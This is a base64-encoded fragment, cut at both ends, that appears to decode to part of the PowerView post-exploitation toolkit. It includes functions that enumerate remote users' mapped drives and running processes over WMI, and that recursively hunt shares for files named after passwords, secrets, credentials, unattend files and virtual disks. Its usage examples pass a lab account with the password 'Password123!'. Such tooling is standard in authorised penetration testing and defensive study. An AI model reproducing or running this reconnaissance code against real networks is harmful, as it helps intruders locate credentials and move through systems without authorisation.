tZSA9ICdsb2NhbGhvc3QnLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAjIEhLRVlfVVNFUlMKICAgICAgICAgICAgJEhLVSA9IDIxNDc0ODM2NTEKCiAgICAgICAgICAgICRXbWlBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0xpc3QnID0gJFRydWUKICAgICAgICAgICAgICAgICdDbGFzcycgPSAnU3RkUmVnUHJvdicKICAgICAgICAgICAgICAgICdOYW1lc3BhY2UnID0gJ3Jvb3RcZGVmYXVsdCcKICAgICAgICAgICAgICAgICdDb21wdXRlcm5hbWUnID0gJENvbXB1dGVyCiAgICAgICAgICAgICAgICAnRXJyb3JBY3Rpb24nID0gJ1N0b3AnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRXbWlBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkUmVnID0gR2V0LVdtaU9iamVjdCBAV21pQXJndW1lbnRzCgogICAgICAgICAgICAgICAgIyBleHRyYWN0IG91dCB0aGUgU0lEcyBvZiBkb21haW4gdXNlcnMgaW4gdGhpcyBoaXZlCiAgICAgICAgICAgICAgICAkVXNlclNJRHMgPSAoJFJlZy5FbnVtS2V5KCRIS1UsICcnKSkuc05hbWVzIHwgV2hlcmUtT2JqZWN0IHsgJF8gLW1hdGNoICdTLTEtNS0yMS1bMC05XSstWzAtOV0rLVswLTldKy1bMC05XSskJyB9CgogICAgICAgICAgICAgICAgRm9yRWFjaCAoJFVzZXJTSUQgaW4gJFVzZXJTSURzKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNpZCAkVXNlclNJRCAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTaWQgJFVzZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJERyaXZlTGV0dGVycyA9ICgkUmVnLkVudW1LZXkoJEhLVSwgIiRVc2VyU0lEXE5ldHdvcmsiKSkuc05hbWVzCgogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkRHJpdmVMZXR0ZXIgaW4gJERyaXZlTGV0dGVycykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByb3ZpZGVyTmFtZSA9ICRSZWcuR2V0U3RyaW5nVmFsdWUoJEhLVSwgIiRVc2VyU0lEXE5ldHdvcmtcJERyaXZlTGV0dGVyIiwgJ1Byb3ZpZGVyTmFtZScpLnNWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFJlbW90ZVBhdGggPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS1UsICIkVXNlclNJRFxOZXR3b3JrXCREcml2ZUxldHRlciIsICdSZW1vdGVQYXRoJykuc1ZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRHJpdmVVc2VyTmFtZSA9ICRSZWcuR2V0U3RyaW5nVmFsdWUoJEhLVSwgIiRVc2VyU0lEXE5ldHdvcmtcJERyaXZlTGV0dGVyIiwgJ1VzZXJOYW1lJykuc1ZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkVXNlck5hbWUpIHsgJFVzZXJOYW1lID0gJycgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUmVtb3RlUGF0aCAtYW5kICgkUmVtb3RlUGF0aCAtbmUgJycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1vdW50ZWREcml2ZSA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1vdW50ZWREcml2ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1vdW50ZWREcml2ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyU0lEJyAkVXNlclNJRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRHJpdmVMZXR0ZXInICREcml2ZUxldHRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHJvdmlkZXJOYW1lJyAkUHJvdmlkZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1vdW50ZWREcml2ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZW1vdGVQYXRoJyAkUmVtb3RlUGF0aAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRHJpdmVVc2VyTmFtZScgJERyaXZlVXNlck5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTW91bnRlZERyaXZlLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5SZWdNb3VudGVkRHJpdmUnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNb3VudGVkRHJpdmUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtV01JUmVnTW91bnRlZERyaXZlXSBFcnJvcjogJF8iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnTW91bnRlZERyaXZlXSBFcnJvciBhY2Nlc3NpbmcgJENvbXB1dGVyLCBsaWtlbHkgaW5zdWZmaWNpZW50IHBlcm1pc3Npb25zIG9yIGZpcmV3YWxsIHJ1bGVzIG9uIGhvc3Q6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LVdNSVByb2Nlc3Mgewo8IwouU1lOT1BTSVMKClJldHVybnMgYSBsaXN0IG9mIHByb2Nlc3NlcyBhbmQgdGhlaXIgb3duZXJzIG9uIHRoZSBsb2NhbCBvciByZW1vdGUgbWFjaGluZS4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZSAgCgouREVTQ1JJUFRJT04KClVzZXMgR2V0LVdNSU9iamVjdCB0byBlbnVtZXJhdGUgYWxsIFdpbjMyX3Byb2Nlc3MgaW5zdGFuY2VzIG9uIHRoZSBsb2NhbCBvciByZW1vdGUgbWFjaGluZSwKaW5jbHVkaW5nIHRoZSBvd25lcnMgb2YgdGhlIHBhcnRpY3VsYXIgcHJvY2Vzcy4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgdGhlIGhvc3RuYW1lIHRvIHF1ZXJ5IGZvciBjYWNoZWQgUkRQIGNvbm5lY3Rpb25zIChhbHNvIGFjY2VwdHMgSVAgYWRkcmVzc2VzKS4KRGVmYXVsdHMgdG8gJ2xvY2FsaG9zdCcuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHJlbW90ZSBzeXN0ZW0uCgouRVhBTVBMRQoKR2V0LVdNSVByb2Nlc3MgLUNvbXB1dGVyTmFtZSBXSU5ET1dTMQoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1XTUlQcm9jZXNzIC1Db21wdXRlck5hbWUgUFJJTUFSWS50ZXN0bGFiLmxvY2FsIC1DcmVkZW50aWFsICRDcmVkCgouT1VUUFVUUwoKUG93ZXJWaWV3LlVzZXJQcm9jZXNzCgpBIFBTQ3VzdG9tT2JqZWN0IGNvbnRhaW5pbmcgdGhlIHJlbW90ZSBwcm9jZXNzIGluZm9ybWF0aW9uLgojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlVzZXJQcm9jZXNzJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFdtaUFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAgICAgJ0NvbXB1dGVyTmFtZScgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgJ0NsYXNzJyA9ICdXaW4zMl9wcm9jZXNzJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRXbWlBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgICAgIEdldC1XTUlvYmplY3QgQFdtaUFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkT3duZXIgPSAkXy5nZXRvd25lcigpOwogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHJvY2Vzc05hbWUnICRfLlByb2Nlc3NOYW1lCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHJvY2Vzc0lEJyAkXy5Qcm9jZXNzSUQKICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEb21haW4nICRPd25lci5Eb21haW4KICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyJyAkT3duZXIuVXNlcgogICAgICAgICAgICAgICAgICAgICRQcm9jZXNzLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Vc2VyUHJvY2VzcycpCiAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LVdNSVByb2Nlc3NdIEVycm9yIGVudW1lcmF0aW5nIHJlbW90ZSBwcm9jZXNzZXMgb24gJyRDb21wdXRlcicsIGFjY2VzcyBsaWtlbHkgZGVuaWVkOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEZpbmQtSW50ZXJlc3RpbmdGaWxlIHsKPCMKLlNZTk9QU0lTCgpTZWFyY2hlcyBmb3IgZmlsZXMgb24gdGhlIGdpdmVuIHBhdGggdGhhdCBtYXRjaCBhIHNlcmllcyBvZiBzcGVjaWZpZWQgY3JpdGVyaWEuCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEFkZC1SZW1vdGVDb25uZWN0aW9uLCBSZW1vdmUtUmVtb3RlQ29ubmVjdGlvbiAgCgouREVTQ1JJUFRJT04KClRoaXMgZnVuY3Rpb24gcmVjdXJzaXZlbHkgc2VhcmNoZXMgYSBnaXZlbiBVTkMgcGF0aCBmb3IgZmlsZXMgd2l0aApzcGVjaWZpYyBrZXl3b3JkcyBpbiB0aGUgbmFtZSAoZGVmYXVsdCBvZiBwYXNzLCBzZW5zaXRpdmUsIHNlY3JldCwgYWRtaW4sCmxvZ2luIGFuZCB1bmF0dGVuZCoueG1sKS4gQnkgZGVmYXVsdCwgaGlkZGVuIGZpbGVzL2ZvbGRlcnMgYXJlIGluY2x1ZGVkCmluIHNlYXJjaCByZXN1bHRzLiBJZiAtQ3JlZGVudGlhbCBpcyBwYXNzZWQsIEFkZC1SZW1vdGVDb25uZWN0aW9uL1JlbW92ZS1SZW1vdGVDb25uZWN0aW9uCmlzIHVzZWQgdG8gdGVtcG9yYXJpbHkgbWFwIHRoZSByZW1vdGUgc2hhcmUuCgouUEFSQU1FVEVSIFBhdGgKClVOQy9sb2NhbCBwYXRoIHRvIHJlY3Vyc2l2ZWx5IHNlYXJjaC4KCi5QQVJBTUVURVIgSW5jbHVkZQoKT25seSByZXR1cm4gZmlsZXMvZm9sZGVycyB0aGF0IG1hdGNoIHRoZSBzcGVjaWZpZWQgYXJyYXkgb2Ygc3RyaW5ncywKaS5lLiBAKCouZG9jKiwgKi54bHMqLCAqLnBwdCopCgouUEFSQU1FVEVSIExhc3RBY2Nlc3NUaW1lCgpPbmx5IHJldHVybiBmaWxlcyB3aXRoIGEgTGFzdEFjY2Vzc1RpbWUgZ3JlYXRlciB0aGFuIHRoaXMgZGF0ZSB2YWx1ZS4KCi5QQVJBTUVURVIgTGFzdFdyaXRlVGltZQoKT25seSByZXR1cm4gZmlsZXMgd2l0aCBhIExhc3RXcml0ZVRpbWUgZ3JlYXRlciB0aGFuIHRoaXMgZGF0ZSB2YWx1ZS4KCi5QQVJBTUVURVIgQ3JlYXRpb25UaW1lCgpPbmx5IHJldHVybiBmaWxlcyB3aXRoIGEgQ3JlYXRpb25UaW1lIGdyZWF0ZXIgdGhhbiB0aGlzIGRhdGUgdmFsdWUuCgouUEFSQU1FVEVSIE9mZmljZURvY3MKClN3aXRjaC4gU2VhcmNoIGZvciBvZmZpY2UgZG9jdW1lbnRzICgqLmRvYyosICoueGxzKiwgKi5wcHQqKQoKLlBBUkFNRVRFUiBGcmVzaEVYRXMKClN3aXRjaC4gRmluZCAuRVhFcyBhY2Nlc3NlZCB3aXRoaW4gdGhlIGxhc3QgNyBkYXlzLgoKLlBBUkFNRVRFUiBFeGNsdWRlRm9sZGVycwoKU3dpdGNoLiBFeGNsdWRlIGZvbGRlcnMgZnJvbSB0aGUgc2VhcmNoIHJlc3VsdHMuCgouUEFSQU1FVEVSIEV4Y2x1ZGVIaWRkZW4KClN3aXRjaC4gRXhjbHVkZSBoaWRkZW4gZmlsZXMgYW5kIGZvbGRlcnMgZnJvbSB0aGUgc2VhcmNoIHJlc3VsdHMuCgouUEFSQU1FVEVSIENoZWNrV3JpdGVBY2Nlc3MKClN3aXRjaC4gT25seSByZXR1cm5zIGZpbGVzIHRoZSBjdXJyZW50IHVzZXIgaGFzIHdyaXRlIGFjY2VzcyB0by4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwp0byBjb25uZWN0IHRvIHJlbW90ZSBzeXN0ZW1zIGZvciBmaWxlIGVudW1lcmF0aW9uLgoKLkVYQU1QTEUKCkZpbmQtSW50ZXJlc3RpbmdGaWxlIC1QYXRoICJDOlxCYWNrdXBcIgoKUmV0dXJucyBhbnkgZmlsZXMgb24gdGhlIGxvY2FsIHBhdGggQzpcQmFja3VwXCB0aGF0IGhhdmUgdGhlIGRlZmF1bHQKc2VhcmNoIHRlcm0gc2V0IGluIHRoZSB0aXRsZS4KCi5FWEFNUExFCgpGaW5kLUludGVyZXN0aW5nRmlsZSAtUGF0aCAiXFxXSU5ET1dTN1xVc2Vyc1wiIC1MYXN0QWNjZXNzVGltZSAoR2V0LURhdGUpLkFkZERheXMoLTcpCgpSZXR1cm5zIGFueSBmaWxlcyBvbiB0aGUgcmVtb3RlIHBhdGggXFxXSU5ET1dTN1xVc2Vyc1wgdGhhdCBoYXZlIHRoZSBkZWZhdWx0CnNlYXJjaCB0ZXJtIHNldCBpbiB0aGUgdGl0bGUgYW5kIHdlcmUgYWNjZXNzZWQgd2l0aGluIHRoZSBsYXN0IHdlZWsuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKRmluZC1JbnRlcmVzdGluZ0ZpbGUgLUNyZWRlbnRpYWwgJENyZWQgLVBhdGggIlxcUFJJTUFSWS50ZXN0bGFiLmxvY2FsXEMkXFRlbXBcIgoKLk9VVFBVVFMKClBvd2VyVmlldy5Gb3VuZEZpbGUKIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Gb3VuZEZpbGUnKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUGF0aCA9ICcuXCcsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdTZWFyY2hUZXJtcycsICdUZXJtcycpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSW5jbHVkZSA9IEAoJypwYXNzd29yZConLCAnKnNlbnNpdGl2ZSonLCAnKmFkbWluKicsICcqbG9naW4qJywgJypzZWNyZXQqJywgJ3VuYXR0ZW5kKi54bWwnLCAnKi52bWRrJywgJypjcmVkcyonLCAnKmNyZWRlbnRpYWwqJywgJyouY29uZmlnJyksCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRMYXN0QWNjZXNzVGltZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJExhc3RXcml0ZVRpbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRDcmVhdGlvblRpbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdPZmZpY2VEb2NzJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkT2ZmaWNlRG9jcywKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZyZXNoRVhFcycpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZyZXNoRVhFcywKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0ZpbGVTcGVjaWZpY2F0aW9uJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhjbHVkZUZvbGRlcnMsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdGaWxlU3BlY2lmaWNhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEV4Y2x1ZGVIaWRkZW4sCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENoZWNrV3JpdGVBY2Nlc3MsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSAgQHsKICAgICAgICAgICAgJ1JlY3Vyc2UnID0gJFRydWUKICAgICAgICAgICAgJ0Vycm9yQWN0aW9uJyA9ICdTaWxlbnRseUNvbnRpbnVlJwogICAgICAgICAgICAnSW5jbHVkZScgPSAkSW5jbHVkZQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydPZmZpY2VEb2NzJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJbmNsdWRlJ10gPSBAKCcqLmRvYycsICcqLmRvY3gnLCAnKi54bHMnLCAnKi54bHN4JywgJyoucHB0JywgJyoucHB0eCcpCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGcmVzaEVYRXMnXSkgewogICAgICAgICAgICAjIGZpbmQgLmV4ZSdzIGFjY2Vzc2VkIHdpdGhpbiB0aGUgbGFzdCA3IGRheXMKICAgICAgICAgICAgJExhc3RBY2Nlc3NUaW1lID0gKEdldC1EYXRlKS5BZGREYXlzKC03KS5Ub1N0cmluZygnTU0vZGQveXl5eScpCiAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSW5jbHVkZSddID0gQCgnKi5leGUnKQogICAgICAgIH0KICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0ZvcmNlJ10gPSAtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRXhjbHVkZUhpZGRlbiddCgogICAgICAgICRNYXBwZWRDb21wdXRlcnMgPSBAe30KCiAgICAgICAgZnVuY3Rpb24gVGVzdC1Xcml0ZSB7CiAgICAgICAgICAgICMgc2hvcnQgaGVscGVyIHRvIGNoZWNrIGlzIHRoZSBjdXJyZW50IHVzZXIgY2FuIHdyaXRlIHRvIGEgZmlsZQogICAgICAgICAgICBbQ21kbGV0QmluZGluZygpXVBhcmFtKFtTdHJpbmddJFBhdGgpCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkRmlsZXRlc3QgPSBbSU8uRmlsZV06Ok9wZW5Xcml0ZSgkUGF0aCkKICAgICAgICAgICAgICAgICRGaWxldGVzdC5DbG9zZSgpCiAgICAgICAgICAgICAgICAkVHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICRGYWxzZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRUYXJnZXRQYXRoIGluICRQYXRoKSB7CiAgICAgICAgICAgIGlmICgoJFRhcmdldFBhdGggLU1hdGNoICdcXFxcLipcXC4qJykgLWFuZCAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pKSB7CiAgICAgICAgICAgICAgICAkSG9zdENvbXB1dGVyID0gKE5ldy1PYmplY3QgU3lzdGVtLlVyaSgkVGFyZ2V0UGF0aCkpLkhvc3QKICAgICAgICAgICAgICAgIGlmICgtbm90ICRNYXBwZWRDb21wdXRlcnNbJEhvc3RDb21wdXRlcl0pIHsKICAgICAgICAgICAgICAgICAgICAjIG1hcCBJUEMkIHRvIHRoaXMgY29tcHV0ZXIgaWYgaXQncyBub3QgYWxyZWFkeQogICAgICAgICAgICAgICAgICAgIEFkZC1SZW1vdGVDb25uZWN0aW9uIC1Db21wdXRlck5hbWUgJEhvc3RDb21wdXRlciAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgICRNYXBwZWRDb21wdXRlcnNbJEhvc3RDb21wdXRlcl0gPSAkVHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1BhdGgnXSA9ICRUYXJnZXRQYXRoCiAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgIyBjaGVjayBpZiB3ZSdyZSBleGNsdWRpbmcgZm9sZGVycwogICAgICAgICAgICAgICAgJENvbnRpbnVlID0gJFRydWUKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0V4Y2x1ZGVGb2xkZXJzJ10gLWFuZCAoJF8uUFNJc0NvbnRhaW5lcikpIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJFeGNsdWRpbmc6ICQoJF8uRnVsbE5hbWUpIgogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCR